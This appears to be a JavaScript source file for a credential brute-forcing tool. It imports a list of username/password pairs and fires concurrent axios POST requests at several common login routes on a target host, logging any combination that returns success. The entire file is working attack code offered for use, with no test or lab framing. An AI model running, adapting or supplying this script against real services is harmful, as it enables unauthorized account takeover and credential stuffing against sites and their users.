import axios from 'axios';

async function bruteForce(username, password, host) {
    try {
        const response = await axios.post(host, {
            username: username,
            password: password
        });

        if (response.status === 200) {
            // Can save the results in a file
            console.log(`Username: ${username} with password ${password} logged in successfully at ${host}`);
            return true;
        }

    } catch (error) {
        if (error.response && error.response.status === 401) {
            console.log(`Invalid Credentials, moving on to the next set..`);
            return false;
        } else {
            console.error("Error occurred: ", error.message);
            return false;
        }
    }
}

import { userPass } from '../Data/user-pass.js'; // Importing Username passwords array

async function bruteForceAllRoutes(homeRoute, subRoutes = ["/login", "/user/login", "/authenticate", "/signin"]) {
    for (const subRoute of subRoutes) {
        const promises = userPass.map(async (userPassword) => {
            await bruteForce(userPassword.username, userPassword.password, homeRoute + subRoute);
        });

        // Wait for all promises to complete for the current subRoute
        await Promise.all(promises);
    }
}
